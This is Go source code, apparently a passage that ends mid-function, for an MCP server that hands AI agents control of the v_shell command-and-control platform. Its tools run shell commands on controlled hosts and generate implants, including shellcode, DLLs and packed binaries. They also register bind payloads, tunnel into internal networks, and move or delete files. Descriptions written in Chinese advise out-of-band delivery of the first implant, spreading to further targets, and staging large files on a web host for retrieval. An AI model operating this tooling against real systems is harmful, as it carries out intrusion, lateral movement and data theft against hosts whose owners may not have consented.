// Package mcp exposes v_shell's command control and file management as
// Model Context Protocol tools over stdio, Streamable HTTP or legacy SSE.
package mcp

import (
	"context"
	"crypto/subtle"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/chinaran404/vshell-mcp/internal/vshell"
	"github.com/mark3labs/mcp-go/mcp"
	"github.com/mark3labs/mcp-go/server"
)

// Server wraps the v_shell client and registers all MCP tools.
type Server struct {
	vs   *vshell.Client
	srv  *server.MCPServer
	base string
}

// New builds the MCP server (tools defined below) for the given v_shell client.
func New(vs *vshell.Client, baseURL, version string) *Server {
	if version == "" {
		version = "dev"
	}
	s := &Server{vs: vs, base: baseURL}
	s.srv = server.NewMCPServer(
		"vshell-mcp",
		version,
		server.WithToolCapabilities(false),
		server.WithInstructions(
			"v_shell 管理平台 MCP:列出主机、执行命令(命令控制)、文件管理(列目录/读写/上传/下载/删除/重命名/新建)。"+
				"host_id 是主机 Id(见 list_hosts)。命令控制通过目标主机的交互式 shell 执行,请使用单条命令,避免交互式程序。",
		),
	)
	s.registerTools()
	return s
}

// Handler returns the underlying MCP server (for embedding).
func (s *Server) Handler() *server.MCPServer { return s.srv }

// Transport names one way clients may talk to this server.
type Transport string

const (
	// TransportStdio speaks JSON-RPC over stdin/stdout; the parent process
	// owns the pipes, so there is no listener and no bearer token.
	TransportStdio Transport = "stdio"
	// TransportSSE is the legacy HTTP+SSE transport (MCP 2024-11-05):
	// GET /sse opens the event stream, POST /message delivers requests.
	TransportSSE Transport = "sse"
	// TransportStreamable is the Streamable HTTP transport (MCP 2025-03-26):
	// the single POST /mcp endpoint answers with JSON or an SSE stream.
	TransportStreamable Transport = "streamable"
	// TransportBoth serves the legacy SSE and the Streamable HTTP endpoints
	// on one listener, so old and new clients can share a port.
	TransportBoth Transport = "both"
)

// StreamablePath is the endpoint the Streamable HTTP transport is mounted at.
const StreamablePath = "/mcp"

// DefaultTransport is what an unspecified -transport resolves to: both HTTP
// endpoints on one listener, so modern Streamable HTTP clients and legacy
// SSE clients work without extra flags. stdio stays opt-in because it changes
// the process shape (no listener at all).
const DefaultTransport = TransportBoth

// ParseTransport validates a -transport flag value. Aliases cover the names
// other clients use for the same wire protocol ("streamable_http", "http").
func ParseTransport(v string) (Transport, error) {
	switch strings.ToLower(strings.TrimSpace(v)) {
	case "":
		return DefaultTransport, nil
	case string(TransportStdio):
		return TransportStdio, nil
	case string(TransportSSE):
		return TransportSSE, nil
	case string(TransportStreamable), "streamable-http", "streamable_http", "http":
		return TransportStreamable, nil
	case string(TransportBoth), "all":
		return TransportBoth, nil
	default:
		return "", fmt.Errorf("未知传输方式 %q(可选: stdio / sse / streamable / both)", v)
	}
}

// ServeStdio runs the stdio transport. The process then speaks JSON-RPC on
// stdin/stdout, so the caller must keep stdout free of any other output
// (diagnostics belong on stderr).
func (s *Server) ServeStdio() error {
	return server.ServeStdio(s.srv)
}

// HTTPHandler builds the handler chain for one HTTP transport: the selected
// MCP transport wrapped in the bearer-token check when authToken is non-empty.
//
// baseURL, when non-empty, is advertised to SSE clients as the message
// endpoint host (use when the MCP server sits behind a proxy); when empty the
// client's own request host is used.
func (s *Server) HTTPHandler(t Transport, baseURL, authToken string) (http.Handler, error) {
	var opts []server.SSEOption
	if baseURL != "" {
		opts = append(opts, server.WithBaseURL(baseURL))
	}
	sse := server.NewSSEServer(s.srv, opts...)
	streamable := server.NewStreamableHTTPServer(s.srv, server.WithEndpointPath(StreamablePath))

	var handler http.Handler
	switch t {
	case TransportSSE:
		handler = sse
	case TransportStreamable:
		handler = streamable
	case TransportBoth:
		handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == StreamablePath {
				streamable.ServeHTTP(w, r)
				return
			}
			sse.ServeHTTP(w, r)
		})
	default:
		return nil, fmt.Errorf("传输方式 %q 不通过 HTTP 提供(stdio 请用 ServeStdio)", t)
	}
	if authToken != "" {
		handler = newAuthHandler(authToken, handler)
	}
	return handler, nil
}

// Serve runs the HTTP listener on addr with the selected transport.
//
// authToken, when non-empty, is required on every request — the SSE stream,
// the SSE message endpoint and the Streamable HTTP endpoint alike — as
// `Authorization: Bearer <token>`. An empty token serves the tools
// unprotected, which is only acceptable when the listener is reachable from
// loopback / an SSH tunnel.
func (s *Server) Serve(addr, baseURL, authToken string, t Transport) error {
	handler, err := s.HTTPHandler(t, baseURL, authToken)
	if err != nil {
		return err
	}
	srv := &http.Server{
		Addr:              addr,
		Handler:           handler,
		ReadHeaderTimeout: 10 * time.Second,
	}
	return srv.ListenAndServe()
}

// StartSSE runs the legacy SSE transport on addr; kept for embedders that
// predate the transport selection.
func (s *Server) StartSSE(addr, baseURL, authToken string) error {
	return s.Serve(addr, baseURL, authToken, TransportSSE)
}

// newAuthHandler guards next with bearer-token authentication: a request must
// carry `Authorization: Bearer <token>`, otherwise it is rejected with 401
// before reaching the MCP transport. The scheme name is matched
// case-insensitively (RFC 7235) and the token itself is compared in constant
// time, so a wrong token cannot be recovered byte by byte through timing.
func newAuthHandler(token string, next http.Handler) http.Handler {
	want := []byte(token)
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		scheme, cred, ok := strings.Cut(r.Header.Get("Authorization"), " ")
		if !ok || !strings.EqualFold(scheme, "Bearer") ||
			subtle.ConstantTimeCompare([]byte(cred), want) != 1 {
			w.Header().Set("WWW-Authenticate", `Bearer realm="vshell-mcp"`)
			http.Error(w, "Unauthorized: missing or invalid bearer token", http.StatusUnauthorized)
			return
		}
		next.ServeHTTP(w, r)
	})
}

// tools registers every MCP tool and its handler.
func (s *Server) registerTools() {
	// --- server info ---
	s.addTool(mcp.NewTool("get_server_info",
		mcp.WithDescription("查看当前连接的 v_shell 服务器信息:连接地址(URL)、登录账号、API 前缀、当前登录用户,以及服务端版本/端口/授权等。"+
			"适合在开始操作前确认连接配置。登录密码默认以 ****** 返回(避免进入对话记录/日志);"+
			"确实需要明文时传 reveal_password=true。"),
		mcp.WithBoolean("reveal_password", mcp.Description("可选:true 时返回明文登录密码,默认 false(打码)")),
	), s.handlerServerInfo)

	s.addTool(mcp.NewTool("get_dashboard",
		mcp.WithDescription("获取 v_shell 服务器仪表盘(dashboard)信息,即管理台 /dashboard 页面展示的指标:"+
			"客户端/监听/代理数量、在线数、CPU/内存/磁盘/负载、收发带宽、TCP/UDP 连接数、版本、授权到期时间等。"),
	), s.handlerDashboard)

	// --- tunnel / proxy ---
	s.addTool(mcp.NewTool("list_tunnels",
		mcp.WithDescription("列出所有隧道/代理(对应管理台 /tunnel/list)。返回每条隧道的 Id、绑定客户端 Id、模式(socks5/http/tcp/udp)、服务端端口、目标、账号、启用/停用状态、客户端在线状态。"+
			"注意:隧道/代理的监听端口开在 **v_shell 服务端主机**上(不是被绑定的目标主机);"+
			"socks5 代理对任何 CONNECT 都回成功码 0x00,不能用它判目标端口存活——判活请用 probe_tunnel(以数据面为准)。"),
	), s.handlerListTunnels)

	s.addTool(mcp.NewTool("add_tunnel",
		mcp.WithDescription("新建隧道/代理。mode 可选 socks5 / http / tcp / udp。tcp/udp 需要 target(格式 10.1.1.99:80);socks5/http 可设 username/password 作认证。"+
			"服务端端口(port)监听在 v_shell 服务端主机上,绑定客户端负责把它转发到 target。"),
		mcp.WithString("client_id", mcp.Required(), mcp.Description("绑定客户端(主机) Id,见 list_hosts")),
		mcp.WithString("mode", mcp.Description("隧道模式,默认 socks5;socks5/http/tcp/udp")),
		mcp.WithNumber("port", mcp.Required(), mcp.Description("服务端监听端口")),
		mcp.WithString("target", mcp.Description("目标 IP:端口,tcp/udp 必填")),
		mcp.WithString("username", mcp.Description("socks5/http 认证用户名,可选")),
		mcp.WithString("password", mcp.Description("socks5/http 认证密码,可选")),
		mcp.WithString("remark", mcp.Description("备注,可选")),
	), s.handlerAddTunnel)

	s.addTool(mcp.NewTool("delete_tunnel",
		mcp.WithDescription("删除单条隧道/代理。"),
		mcp.WithNumber("id", mcp.Required(), mcp.Description("隧道 Id,见 list_tunnels")),
	), s.handlerDeleteTunnel)

	s.addTool(mcp.NewTool("delete_tunnels",
		mcp.WithDescription("批量删除隧道/代理。"),
		mcp.WithArray("ids", mcp.Description("隧道 Id 数组")),
	), s.handlerDeleteTunnels)

	s.addTool(mcp.NewTool("start_tunnel",
		mcp.WithDescription("启用指定隧道/代理。幂等:已经在运行时返回 status=already_running,不再把服务端的 start error 当失败;"+
			"Id 不存在会明确报错,失败信息里会带上当前 RunStatus 与客户端在线状态。"),
		mcp.WithNumber("id", mcp.Required(), mcp.Description("隧道 Id")),
	), s.handlerStartTunnel)

	s.addTool(mcp.NewTool("stop_tunnel",
		mcp.WithDescription("停用指定隧道/代理。幂等:本来已停用时返回 status=already_stopped。"),
		mcp.WithNumber("id", mcp.Required(), mcp.Description("隧道 Id")),
	), s.handlerStopTunnel)

	s.addTool(mcp.NewTool("edit_tunnel",
		mcp.WithDescription("编辑隧道/代理的配置(客户端、模式、端口、目标、账号、备注)。"),
		mcp.WithNumber("id", mcp.Required(), mcp.Description("隧道 Id")),
		mcp.WithString("client_id", mcp.Description("绑定客户端 Id")),
		mcp.WithString("mode", mcp.Description("模式:socks5/http/tcp/udp")),
		mcp.WithNumber("port", mcp.Description("服务端端口")),
		mcp.WithString("target", mcp.Description("目标 IP:端口")),
		mcp.WithString("username", mcp.Description("用户名")),
		mcp.WithString("password", mcp.Description("密码")),
		mcp.WithString("remark", mcp.Description("备注")),
	), s.handlerEditTunnel)

	s.addTool(mcp.NewTool("set_tunnel_remark",
		mcp.WithDescription("修改隧道/代理的备注。"),
		mcp.WithNumber("id", mcp.Required(), mcp.Description("隧道 Id")),
		mcp.WithString("remark", mcp.Required(), mcp.Description("新备注")),
	), s.handlerSetTunnelRemark)

	s.addTool(mcp.NewTool("probe_tunnel",
		mcp.WithDescription("连通性自检:实测「服务端 → 客户端 → 目标」这一段到底通不通,而不是只看配置里的 IsConnect/RunStatus。\n"+
			"做法:在隧道监听端口上完成一次真实转发(socks5/http 走握手+CONNECT,tcp 直接连),再看数据面发生了什么。\n"+
			"结论(verdict):data_open=收到数据(确定通)/ refused=连接被立即关闭(拒连或不可达)/ no_data=连接没关但窗口内没数据(无法判定,见 hint)/ "+
			"open_request_rejected=不带请求时连接保持、带上 send 才被关闭(端口是开的,只是这段请求被拒)/ "+
			"unreachable=代理明确回报无路由 / proxy_down=隧道端口都连不上(隧道未启用或服务端不可达)/ unsupported=udp 隧道无法这样测。\n"+
			"⚠️ v_shell 的 socks5 对任何 CONNECT 都回成功码 0x00(不存在的主机、关闭的端口也回 0x00),所以本工具**只认数据面**,socks_reply 仅作参考。\n"+
			"想要确定性结论(避开 no_data 的歧义):带上 send / send_hex 发一个该协议的请求,例如 send=\"GET / HTTP/1.0\\r\\n\\r\\n\",有数据回来即 100% 通。\n"+
			"参数:target 可选,格式 ip:port(socks5/http 要判目标存活时必须给;tcp 默认用隧道自身的 target)。"),
		mcp.WithNumber("id", mcp.Required(), mcp.Description("隧道/代理 Id,见 list_tunnels")),
		mcp.WithString("target", mcp.Description("可选:要探测的目标 ip:port(socks5/http 建议给;tcp 默认用隧道配置的 target)")),
		mcp.WithString("send", mcp.Description("可选:转发建立后发出的请求文本(≤1024 字节),如 GET / HTTP/1.0\\r\\n\\r\\n;用来把 no_data 变成确定结论")),
		mcp.WithString("send_hex", mcp.Description("可选:同 send,但以十六进制书写(如 16 03 01 ...),适合二进制协议;优先于 send")),
		mcp.WithNumber("timeout_seconds", mcp.Description("可选:拨号与等待数据的秒数,默认 5(上限 30)")),
	), s.handlerProbeTunnel)

	// --- listener management (view/add/edit/start/stop/remark; deletion intentionally NOT exposed) ---
	s.addTool(mcp.NewTool("list_listeners",
		mcp.WithDescription("查看所有监听器(对应管理台 /listener/list)。返回每个监听器的 Id、模式、监听地址、外网连接地址、心跳间隔、超时心跳次数、Vkey、加密盐、备注、运行状态。"+
			"status / mode 过滤由本工具在本地完成(v_shell 的 /listener/list 并不按 status 过滤);"+
			"返回里 total=过滤后数量、total_unfiltered=全部数量、filtered_out=被过滤掉的条数,便于区分「没有监听器」和「全被过滤掉」。"),
		mcp.WithString("status", mcp.Description("可选:'true'/'false',按运行状态过滤(本地过滤)")),
		mcp.WithString("mode", mcp.Description("可选:按模式过滤,如 tcp/kcp/ws/dns/doh/dot/oss(本地过滤)")),
	), s.handlerListListeners)

	s.addTool(mcp.NewTool("add_listener",
		mcp.WithDescription("新建监听器。mode 可选 tcp/kcp/ws/dns/doh/dot/oss(默认 tcp)。"+
			"各模式所需地址:tcp/kcp 用 connect_addr,ws 用 ws_connect_addr,dns/doh/dot 用 dns_domain 与 public_dns,oss 用 oss_url。"+
			"listen_addr 为服务端监听地址(如 0.0.0.0:21480),vkey 与 encrypt_salt 必填。\n"+
			"⚠️ listen_addr 永远绑定在 **v_shell 服务端主机**上:client_id 只是记录绑定关系,不会让端口开在目标主机上(目标机 netstat 查不到)。"+
			"要在内网主机上开监听端口,请用 generate_client(kind=listen) 生成 bind 载荷送到目标运行,再 register_client 让它上线。"+
			"报错 open failed 通常是服务端侧原因:端口被占用、无权限绑定、地址不属于本机。"),
		mcp.WithString("client_id", mcp.Description("可选:绑定客户端 Id(0 表示暂不绑定)。注意:不会把监听落到目标主机上,见工具说明")),
		mcp.WithString("mode", mcp.Description("监听模式,默认 tcp")),
		mcp.WithString("listen_addr", mcp.Required(), mcp.Description("服务端监听地址,如 0.0.0.0:21480")),
		mcp.WithString("connect_addr", mcp.Description("外网连接地址,tcp/kcp 使用,如 1.2.3.4:21480")),
		mcp.WithString("ws_connect_addr", mcp.Description("ws 连接地址,ws 模式使用")),
		mcp.WithString("dns_domain", mcp.Description("NS 域名,dns/doh/dot 模式使用")),
		mcp.WithString("public_dns", mcp.Description("公共 DNS,dns/doh/dot 模式使用")),
		mcp.WithString("oss_url", mcp.Description("Bucket 域名,oss 模式使用")),
		mcp.WithNumber("disconnect_timeout", mcp.Description("超时心跳次数,默认 30")),
		mcp.WithNumber("ping_interval", mcp.Description("心跳间隔(秒),默认 10")),
		mcp.WithString("vkey", mcp.Description("Vkey 认证密钥,必填")),
		mcp.WithString("encrypt_salt", mcp.Description("流量加密盐,必填")),
		mcp.WithString("remark", mcp.Description("备注,可选")),
	), s.handlerAddListener)

	s.addTool(mcp.NewTool("start_listener",
		mcp.WithDescription("启用(启动)一个监听器,对应管理台监听器列表的「启用」。Id 见 list_listeners。"+
			"幂等:监听器本来就在运行时直接返回 status=already_running(不再抛服务端的 already start 错误);Id 不存在会明确报 not found。"),
		mcp.WithString("id", mcp.Required(), mcp.Description("监听器 Id")),
	), s.handlerStartListener)

	s.addTool(mcp.NewTool("stop_listener",
		mcp.WithDescription("停用一个监听器,对应管理台监听器列表的「停用」。Id 见 list_listeners。"+
			"幂等:监听器本来就停用时直接返回 status=already_stopped。"),
		mcp.WithString("id", mcp.Required(), mcp.Description("监听器 Id")),
	), s.handlerStopListener)

	s.addTool(mcp.NewTool("edit_listener",
		mcp.WithDescription("修改监听器配置(字段与 add_listener 相同,另需 id)。"+
			"建议先用 list_listeners 读出当前值再整体回传,避免把未传字段重置为默认值"+
			"(mode 默认 tcp、disconnect_timeout 默认 30、ping_interval 默认 10)。删除监听器不在本工具范围内。"+
			"listen_addr 同样绑定在 v_shell 服务端主机上,client_id 不会改变绑定位置。"),
		mcp.WithString("id", mcp.Required(), mcp.Description("监听器 Id")),
		mcp.WithString("client_id", mcp.Description("绑定客户端 Id(0 表示不绑定;不改变监听绑定位置)")),
		mcp.WithString("mode", mcp.Description("监听模式,默认 tcp")),
		mcp.WithString("listen_addr", mcp.Required(), mcp.Description("服务端监听地址,如 0.0.0.0:21480")),
		mcp.WithString("connect_addr", mcp.Description("外网连接地址,tcp/kcp 使用")),
		mcp.WithString("ws_connect_addr", mcp.Description("ws 连接地址,ws 模式使用")),
		mcp.WithString("dns_domain", mcp.Description("NS 域名,dns/doh/dot 模式使用")),
		mcp.WithString("public_dns", mcp.Description("公共 DNS,dns/doh/dot 模式使用")),
		mcp.WithString("oss_url", mcp.Description("Bucket 域名,oss 模式使用")),
		mcp.WithNumber("disconnect_timeout", mcp.Description("超时心跳次数,默认 30")),
		mcp.WithNumber("ping_interval", mcp.Description("心跳间隔(秒),默认 10")),
		mcp.WithString("vkey", mcp.Description("Vkey 认证密钥")),
		mcp.WithString("encrypt_salt", mcp.Description("流量加密盐")),
		mcp.WithString("remark", mcp.Description("备注")),
	), s.handlerEditListener)

	s.addTool(mcp.NewTool("set_listener_remark",
		mcp.WithDescription("只修改监听器备注,不动其他配置(对应 /listener/editremark)。"),
		mcp.WithString("id", mcp.Required(), mcp.Description("监听器 Id")),
		mcp.WithString("remark", mcp.Required(), mcp.Description("新备注")),
	), s.handlerSetListenerRemark)

	// --- client generation (download) ---
	s.addTool(mcp.NewTool("generate_client",
		mcp.WithDescription("生成并下载 v_shell 客户端(对应管理台 /download 客户端生成页),保存到 MCP 服务器本地路径。\n"+
			"kind 取值与所需参数:\n"+
			"- stage   反向客户端(需要监听器):listener_id + arch\n"+
			"- listen  正向客户端:arch + tp(tcp/kcp/ws)+ host + port + vkey + salt(+upx)\n"+
			"- listendll DLL 正向客户端:同上(arch 用 windows_amd64.dll / windows_i386.dll)\n"+
			"- stageless 无阶段客户端(需要监听器):listener_id + arch(+upx +proxy)\n"+
			"- shellcode shellcode(需要监听器):listener_id + arch(windows_amd64/windows_i386)+ format(.bin/.c/.raw.txt)\n"+
			"- dll     DLL(需要监听器):listener_id + arch(windows_amd64.dll/windows_i386.dll 或 loader)(+upx +proxy)\n"+
			"- ebpf    eBPF 客户端:arch + tp + vkey + salt(服务端固定 0.0.0.0:49319,listen+ebpf)\n"+
			"arch 取值: darwin_amd64 / darwin_arm64 / linux_amd64 / linux_i386 / linux_arm64 / linux_arm / windows_amd64(.exe/.dll)/ windows_i386(.exe/.dll)。\n"+
			"选哪个:内网 bind(目标无法反连服务端)用 kind=listen 生成 bind 载荷,送到目标运行后再 register_client 上线;"+
			"能反连的场景用 kind=stage(需要先有 stage 监听器),主机自己回连,不必调用 register_client。\n"+
			"监听器 Id 用 list_listeners 查看。save_path 为 MCP 服务器上的保存路径(必填)。\n"+
			"⚠️ 首次投递:生成物落在 MCP 服务器本地,而 upload_file 要求目标主机已在线,二者互锁——"+
			"首台主机必须用带外通道投递(HTTP 下载、共享目录、已有 shell 等)。主机上线后即可用 upload_file 铺开到后续目标。"),
		mcp.WithString("kind", mcp.Required(), mcp.Description("生成类型:stage / listen / listendll / stageless / shellcode / dll / ebpf")),
		mcp.WithString("save_path", mcp.Required(), mcp.Description("保存到 MCP 服务器本地的文件路径,如 /tmp/client/stage_linux")),
		mcp.WithString("arch", mcp.Description("客户端类型/架构,如 linux_amd64、windows_amd64.exe、windows_amd64.dll、loader")),
		mcp.WithString("listener_id", mcp.Description("监听器 Id(stage/stageless/shellcode/dll 必填)")),
		mcp.WithString("tp", mcp.Description("通讯类型 tcp/kcp/ws(listen/listendll/ebpf 使用)")),
		mcp.WithString("host", mcp.Description("服务端地址或 IP(listen/listendll 使用)")),
		mcp.WithNumber("port", mcp.Description("服务端端口(listen/listendll 使用)")),
		mcp.WithString("vkey", mcp.Description("通信凭证 Vkey(listen/listendll/ebpf 必填)")),
		mcp.WithString("salt", mcp.Description("流量加密盐(listen/listendll/ebpf 必填)")),
		mcp.WithString("upx", mcp.Description("是否 UPX 压缩:'true'/'false',默认 false")),
		mcp.WithString("proxy", mcp.Description("连接代理,格式 socks5://127.0.0.1:1080(dll/stageless 可选)")),
		mcp.WithString("format", mcp.Description("shellcode 格式:.bin / .c / .raw.txt(shellcode 必填)")),
	), s.handlerGenerateClient)

	// --- forward (bind) client registration ---
	s.addTool(mcp.NewTool("register_client",
		mcp.WithDescription("注册正向(bind)客户端:让 v_shell 服务端主动去连接目标主机上已在监听的 bind payload,使其上线。\n"+
			"参数必须与生成该 payload 时一致(tp + ip/port 或 ws 地址 + vkey + salt),否则连不上或校验失败。\n"+
			"典型流程:generate_client(kind=listen) 生成 payload → 投递并在目标上运行(它会监听该端口)→ "+
			"register_client 注册上线 → list_hosts 里出现该主机(IsConnect=true)。\n"+
			"前提:v_shell 服务端所在网络能直达目标的 ip:port(tp=ws 时能访问该 ws 地址);目标不可达会连接失败。\n"+
			"注意:目标主机上必须先跑起 bind payload,否则本调用不会让任何东西上线。\n"+
			"「服务端能否连到目标」没有独立的预探测接口——本调用本身就是探测:返回成功且 list_hosts 里出现该主机(IsConnect=true)才算真的通;"+
			"失败通常意味着目标 payload 没在监听,或服务端到该地址路由不通(可先用 probe_tunnel 验证反方向「服务端经隧道→目标」是否可达)。\n"+
			"注意:/client/add 是**新增**语义——同一个目标重复注册会产生多条记录(旧的停在离线状态),"+
			"需要在控制台清理;注册成功后请用 list_hosts 按 Addr 确认哪条是新上线的。"),
		mcp.WithString("tp", mcp.Description("连接方式:tcp / kcp / ws(默认 tcp)")),
		mcp.WithString("ip", mcp.Description("目标 IP 或域名(tp=tcp/kcp 时必填;也可直接给 IP)")),
		mcp.WithNumber("port", mcp.Description("目标监听端口(tp=tcp/kcp 时必填)")),
		mcp.WithString("host", mcp.Description("WS 地址,如 ws://192.168.1.1:8080/ws(tp=ws 时必填)")),
		mcp.WithString("vkey", mcp.Required(), mcp.Description("通信凭证 Vkey,必须与生成 payload 时一致")),
		mcp.WithString("salt", mcp.Required(), mcp.Description("流量加密盐,必须与生成 payload 时一致")),
		mcp.WithBoolean("ebpf", mcp.Description("是否为 eBPF 客户端(默认 false;仅支持 tp=tcp/ws)")),
		mcp.WithString("proxy", mcp.Description("可选:服务端连接时走的代理,如 socks5://127.0.0.1:1080")),
	), s.handlerRegisterClient)

	// --- host discovery ---
	s.addTool(mcp.NewTool("list_hosts",
		mcp.WithDescription("列出 v_shell 管理平台中的所有主机/客户端(在线与离线)。返回每台主机的 Id、IP、主机名、系统、用户、位置、状态等。"+
			"通过 host_id 可查询单台主机详情,online_only=true 只返回在线主机。"),
		mcp.WithString("host_id", mcp.Description("可选:只返回指定主机 Id")),
		mcp.WithString("online_only", mcp.Description("可选:'true'/'false',是否只返回在线主机")),
	), s.handlerListHosts)

	// --- command control ---
	s.addTool(mcp.NewTool("execute_command",
		mcp.WithDescription("在指定主机上执行 shell 命令(命令控制)。通过目标主机的交互式终端执行,返回命令的标准输出(stdout 与 stderr 合并)与退出码。"+
			"按主机系统自动选用 shell 语法:Windows 走 cmd(用 & 串联、%errorlevel% 取状态),Linux/macOS 走 sh(用 ; 串联、$? 取状态)。"+
			"支持管道/重定向等常规语法;请使用非交互式命令。返回的 exit_code 非 0 表示命令失败(ok=false);"+
			"若命令在 timeout_seconds 内未结束,则直接返回错误并附上已捕获的部分输出(命令可能仍在主机上运行)。"+
			"命令停在交互式提示(如 cmd 的 \"-- More --\" 分页)时会立即中止并说明,不会空等超时;请改用非交互写法。"),
		mcp.WithString("host_id", mcp.Required(), mcp.Description("目标主机 Id(见 list_hosts)")),
		mcp.WithString("command", mcp.Required(), mcp.Description("要执行的 shell 命令")),
		mcp.WithString("workdir", mcp.Description("可选:命令执行前先 cd 到的目录")),
		mcp.WithNumber("timeout_seconds", mcp.Description("可选:超时秒数,默认 60")),
	), s.handlerExecCommand)

	// --- file management ---
	s.addTool(mcp.NewTool("list_directory",
		mcp.WithDescription("列出主机上指定目录的内容(文件管理)。返回每个条目的名称、类型(目录/文件)、大小、权限、修改时间。"),
		mcp.WithString("host_id", mcp.Required(), mcp.Description("目标主机 Id")),
		mcp.WithString("path", mcp.Description("可选:目录路径,默认 '/'")),
	), s.handlerListDirectory)

	s.addTool(mcp.NewTool("get_disks",
		mcp.WithDescription("获取主机的磁盘/挂载信息。"),
		mcp.WithString("host_id", mcp.Required(), mcp.Description("目标主机 Id")),
	), s.handlerGetDisks)

	s.addTool(mcp.NewTool("read_file",
		mcp.WithDescription("读取主机上文件的内容。二进制内容会以 base64 返回并在 base64_encoded 字段标注。"+
			"注意:v_shell 服务端(/file/cat)按 UTF-8 解码文件,遇到 GBK/ANSI 等本地编码的字节会替换成 U+FFFD,"+
			"原始字节不可恢复——此时返回里会有 bytes_replaced 与 encoding_warning,需要原始内容请改用 download_file。"),
		mcp.WithString("host_id", mcp.Required(), mcp.Description("目标主机 Id")),
		mcp.WithString("path", mcp.Required(), mcp.Description("文件所在目录路径")),
		mcp.WithString("filename", mcp.Required(), mcp.Description("文件名")),
	), s.handlerReadFile)

	s.addTool(mcp.NewTool("write_file",
		mcp.WithDescription("向主机写入文件(创建或覆盖)。content 为完整文件内容。"),
		mcp.WithString("host_id", mcp.Required(), mcp.Description("目标主机 Id")),
		mcp.WithString("path", mcp.Required(), mcp.Description("文件所在目录路径")),
		mcp.WithString("filename", mcp.Required(), mcp.Description("文件名")),
		mcp.WithString("content", mcp.Required(), mcp.Description("文件内容")),
	), s.handlerWriteFile)

	s.addTool(mcp.NewTool("create_directory",
		mcp.WithDescription("在主机上新建目录。"),
		mcp.WithString("host_id", mcp.Required(), mcp.Description("目标主机 Id")),
		mcp.WithString("path", mcp.Required(), mcp.Description("父目录路径")),
		mcp.WithString("dirname", mcp.Required(), mcp.Description("要创建的目录名")),
	), s.handlerCreateDirectory)

	s.addTool(mcp.NewTool("create_file",
		mcp.WithDescription("在主机上新建空文件。"),
		mcp.WithString("host_id", mcp.Required(), mcp.Description("目标主机 Id")),
		mcp.WithString("path", mcp.Required(), mcp.Description("目录路径")),
		mcp.WithString("filename", mcp.Required(), mcp.Description("文件名")),
	), s.handlerCreateFile)

	s.addTool(mcp.NewTool("delete_file",
		mcp.WithDescription("删除主机上的文件或目录。"),
		mcp.WithString("host_id", mcp.Required(), mcp.Description("目标主机 Id")),
		mcp.WithString("path", mcp.Required(), mcp.Description("目录路径")),
		mcp.WithString("filename", mcp.Required(), mcp.Description("要删除的文件/目录名")),
	), s.handlerDeleteFile)

	s.addTool(mcp.NewTool("delete_files",
		mcp.WithDescription("批量删除主机上的文件或目录。"),
		mcp.WithString("host_id", mcp.Required(), mcp.Description("目标主机 Id")),
		mcp.WithString("path", mcp.Required(), mcp.Description("目录路径")),
		mcp.WithArray("names", mcp.Description("要删除的文件/目录名列表")),
	), s.handlerDeleteFiles)

	s.addTool(mcp.NewTool("rename_file",
		mcp.WithDescription("重命名或移动主机上的文件/目录。"),
		mcp.WithString("host_id", mcp.Required(), mcp.Description("目标主机 Id")),
		mcp.WithString("path", mcp.Required(), mcp.Description("文件所在目录路径")),
		mcp.WithString("target", mcp.Required(), mcp.Description("当前文件名")),
		mcp.WithString("new_name", mcp.Required(), mcp.Description("新文件名(可含路径以移动)")),
	), s.handlerRenameFile)

	s.addTool(mcp.NewTool("wget_file",
		mcp.WithDescription("让主机通过 URL 下载文件到指定目录(使用主机自带 wget/curl 能力)。"),
		mcp.WithString("host_id", mcp.Required(), mcp.Description("目标主机 Id")),
		mcp.WithString("path", mcp.Required(), mcp.Description("保存目录路径")),
		mcp.WithString("url", mcp.Required(), mcp.Description("要下载的 URL")),
	), s.handlerWgetFile)

	s.addTool(mcp.NewTool("upload_file",
		mcp.WithDescription("将 MCP 服务器本地的文件上传到主机目录。"),
		mcp.WithString("host_id", mcp.Required(), mcp.Description("目标主机 Id")),
		mcp.WithString("path", mcp.Required(), mcp.Description("主机上的目标目录")),
		mcp.WithString("local_path", mcp.Required(), mcp.Description("MCP 服务器本地文件路径")),
		mcp.WithString("remote_name", mcp.Description("可选:主机上的文件名,默认取本地文件名")),
	), s.handlerUploadFile)

	s.addTool(mcp.NewTool("download_file",
		mcp.WithDescription("将主机上的文件下载到 MCP 服务器本地(经 v_shell 服务端中转)。\n"+
			"⚠️ 这是**两跳**传输:①服务端先把文件从目标主机拉到自己的暂存目录(大文件/慢链路可能要几分钟到几十分钟),"+
			"②MCP 再从服务端把文件取回本地。真正慢的是 ①,而 ① 由服务端在后台继续,和本次调用是否超时无关。\n"+
			"暂存没完成时,本工具**不会**返回半个文件,而是返回 staged=false + staging_percent + note;"+
			"直接**重试** download_file 即可:服务端会复用 download/<客户端Id>/ 里已暂存的内容,暂存完成时重试通常秒回。\n"+
			"若目标链路慢、文件又大,更快的路子是在目标侧把文件复制到一台可 HTTP 访问的主机(如 web1 的网站目录)再用 wget_file 或直接 HTTP 拉取。\n"+
			"stage_wait_seconds 控制本次等待暂存的最长时间(默认 120 秒)。"),
		mcp.WithString("host_id", mcp.Required(), mcp.Description("目标主机 Id")),
		mcp.WithString("path", mcp.Required(), mcp.Description("文件所在目录路径")),
		mcp.WithString("filename", mcp.Required(), mcp.Description("文件名")),
		mcp.WithString("local_path", mcp.Description("可选:保存到本地的路径,默认当前目录下的文件名")),
		mcp.WithNumber("stage_wait_seconds", mcp.Description("可选:等待服务端暂存完成的最长秒数,默认 120(上限 3600);到点未完成会返回 staged=false 而不是半个文件")),
	), s.handlerDownloadFile)
}

func (s *Server) addTool(t mcp.Tool, fn func(ctx context.Context, r mcp.CallToolRequest) (*mcp.CallToolResult, error)) {
	s.srv.AddTool(t, fn)
}

// --- helpers ---

func resultJSON(v any) (*mcp.CallToolResult, error) {
	b, err := json.MarshalIndent(v, "", "  ")
	if err != nil {
		return mcp.NewToolResultError("marshal result: " + err.Error()), err
	}
	return mcp.NewToolResultText(string(b)), nil
}

// previewOutput bounds the partial output attached to an error message: a
// timed-out or pager-stalled command can have produced megabytes, and the caller
// needs the head of it, not the whole buffer.
func previewOutput(s string) string {
	const max = 2000
	if len(s) <= max {
		return s
	}
	return s[:max] + fmt.Sprintf("\n…(已截断,%d 字节中的前 %d 字节)", len(s), max)
}

func hostID(r mcp.CallToolRequest) (int, error) {
	idStr := r.GetString("host_id", "")
